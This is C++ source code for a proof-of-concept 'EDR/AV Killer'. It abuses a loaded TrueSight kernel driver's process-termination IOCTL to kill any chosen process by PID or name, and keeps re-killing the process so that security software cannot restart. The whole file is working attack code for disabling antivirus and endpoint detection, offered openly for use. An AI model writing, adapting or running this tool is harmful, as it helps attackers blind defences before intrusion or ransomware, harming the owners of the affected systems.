#include <windows.h>
#include <iostream>

#define TERMINATE_PROCESS_IOCTL_CODE 0x22e044
#define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)    // ntsubauth

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;


typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef struct _SYSTEM_PROCESS_INFO
{
    ULONG                   NextEntryOffset;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ImageName;
    ULONG                   BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessId;
} SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;



typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45,
    SystemCodeIntegrityInformation = 103,
    SystemPolicyInformation = 134,
} SYSTEM_INFORMATION_CLASS;

_NtQuerySystemInformation NtQuerySystemInformation;
volatile BOOL continueLoop = TRUE;

VOID toLowerCase(wchar_t* str) {
    for (int i = 0; str[i] != '\0'; i++) {
        if (str[i] >= 'A' && str[i] <= 'Z') {
            str[i] = str[i] + 32;
        }
    }
}

BOOL WINAPI CtrlHandler(DWORD fdwCtrlType) {
    if (fdwCtrlType == CTRL_C_EVENT) {
        std::wcout << L"\n[!] CTRL+C received. Stopping...\n";
        continueLoop = FALSE;
        return TRUE;
    }
    return FALSE;
}

BOOL CheckIfPID(DWORD pid, wchar_t** processName) {

    ULONG size = 0;
    NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &size);
    PSYSTEM_PROCESS_INFO spi = (PSYSTEM_PROCESS_INFO)malloc(size);

    if (NtQuerySystemInformation(SystemProcessInformation, spi, size, &size) != STATUS_SUCCESS) {
        std::wcout << L"[-] Failed to get SystemProcessInformation" << std::endl;
        free(spi);
        return FALSE;
    }

    PSYSTEM_PROCESS_INFO current = spi;
    do {
        if ((DWORD)(current->ProcessId) == pid) {
            std::wstring currentProcessName(current->ImageName.Buffer, current->ImageName.Length / sizeof(wchar_t));
            toLowerCase(&currentProcessName[0]);
            *processName = current->ImageName.Buffer;
            std::wcout << L"[+] Process name: " << current->ImageName.Buffer << std::endl;
            free(spi);
            return TRUE;
        }
        current = (PSYSTEM_PROCESS_INFO)(((LPBYTE)current) + current->NextEntryOffset);
    } while (current->NextEntryOffset != 0);

    free(spi);
    return FALSE;
}

DWORD CheckIfProcessName(wchar_t* processName) {
    std::wcout << L"[+] Checking if process name: " << processName << L" is running" << std::endl;
    ULONG size = 0;
    NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &size);

    PSYSTEM_PROCESS_INFO spi = (PSYSTEM_PROCESS_INFO)malloc(size);

    if (NtQuerySystemInformation(SystemProcessInformation, spi, size, &size) != STATUS_SUCCESS) {
        std::wcout << L"[-] Failed to get SystemProcessInformation" << std::endl;
        free(spi);
        return FALSE;
    }

    PSYSTEM_PROCESS_INFO current = spi;
    do {
        if (current->ImageName.Buffer) {
            std::wstring currentProcessName(current->ImageName.Buffer, current->ImageName.Length / sizeof(wchar_t));
            toLowerCase(&currentProcessName[0]);
            std::wstring processNameW(processName);
            toLowerCase(&processNameW[0]);

            if (processNameW.compare(currentProcessName) == 0) {
                DWORD processId = (DWORD)(current->ProcessId);
                free(spi);
                std::wcout << L"[+] Process PID: " << processId << std::endl;
                return processId;
            }
        }
        current = (PSYSTEM_PROCESS_INFO)(((LPBYTE)current) + current->NextEntryOffset);
    } while (current->NextEntryOffset != 0);

    free(spi);
    return NULL;
}

int main(int argc, char** argv) {
    std::wcout << L"Welcome to EDR/AV Killer using truesight driver!" << std::endl;
    std::wcout << L"This is a PoC, use it at your own risk!" << std::endl;
    std::wcout << L"[!] Assuming TrueSight driver is already loaded on the system!" << std::endl;

    BOOL isPID = FALSE;

    // Set the CTRL+C handler
    if (!SetConsoleCtrlHandler(CtrlHandler, TRUE)) {
        std::wcerr << L"[-] Failed to set CTRL+C handler. Exiting...\n";
        return 1;
    }

    if (argc != 3) {
        std::wcout << L"Usage: " << argv[0] << L" -p <PID> / -n <PROCESS NAME>" << std::endl;
        return 1;
    }

    wchar_t* processName = NULL;
    DWORD pid = 0;

    if (strcmp(argv[1], "-p") == 0) {
        isPID = TRUE;
        pid = atoi(argv[2]);

    }
    else if (strcmp(argv[1], "-n") == 0) {
        size_t len = strlen(argv[2]) + 1;
        processName = new wchar_t[len];
        size_t convertedChars = 0;
        mbstowcs_s(&convertedChars, processName, len, argv[2], _TRUNCATE);

    }
    else {
        std::wcout << L"Usage: " << argv[0] << L" -p <PID> / -n <PROCESS NAME>" << std::endl;
        return 1;
    }

    NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

    if (isPID) {
        if (!CheckIfPID(pid, &processName)) {
            std::wcout << L"[-] Process with PID " << pid << L" not found!" << std::endl;
            return 1;
        }
        std::wcout << L"[+] Process name: " << processName << std::endl;
    }
    else {
        pid = CheckIfProcessName(processName);

        if (pid == NULL) {
            std::wcout << L"[-] Process name: " << processName << L" is not running" << std::endl;
            return 1;
        }
    }

    // Try to open the driver device (assuming driver is already loaded)
    HANDLE hDevice = CreateFileW(L"\\\\.\\TrueSight", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        std::wcout << L"[-] Failed to open TrueSight device. Error: " << error << std::endl;
        std::wcout << L"[-] Make sure the TrueSight driver is already loaded on the system!" << std::endl;
        return 1;
    }

    std::wcout << L"[+] Successfully opened TrueSight driver device!" << std::endl;

    std::wcout << L"[+] Terminating PID: " << pid << std::endl;
    DWORD bytesReturned = 0;

    if (!DeviceIoControl(hDevice, TERMINATE_PROCESS_IOCTL_CODE, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL)) {
        std::wcout << L"[-] DeviceIoControl failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hDevice);
        return 1;
    }

    std::wcout << L"[+] Successfully sent termination request!" << std::endl;

    // Continuous monitoring loop (optional)
    for (;;) {
        Sleep(700);

        if (!continueLoop) {
            break;
        }

        pid = CheckIfProcessName(processName);
        if (pid == NULL) {
            std::wcout << L"[+] Process name: " << processName << L" is no longer running" << std::endl;
            Sleep(1200);
            break;
        }

        std::wcout << L"[+] Process still running. Terminating PID: " << pid << std::endl;
        if (!DeviceIoControl(hDevice, TERMINATE_PROCESS_IOCTL_CODE, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL)) {
            std::wcout << L"[-] DeviceIoControl failed. Error: " << GetLastError() << std::endl;
            continue;
        }
        std::wcout << L"[+] Successfully sent termination request!" << std::endl;
    }

    std::wcout << L"[!] Exiting..." << std::endl;
    CloseHandle(hDevice);

    // Clean up
    if (processName && !isPID) {
        delete[] processName;
    }

    return 0;
}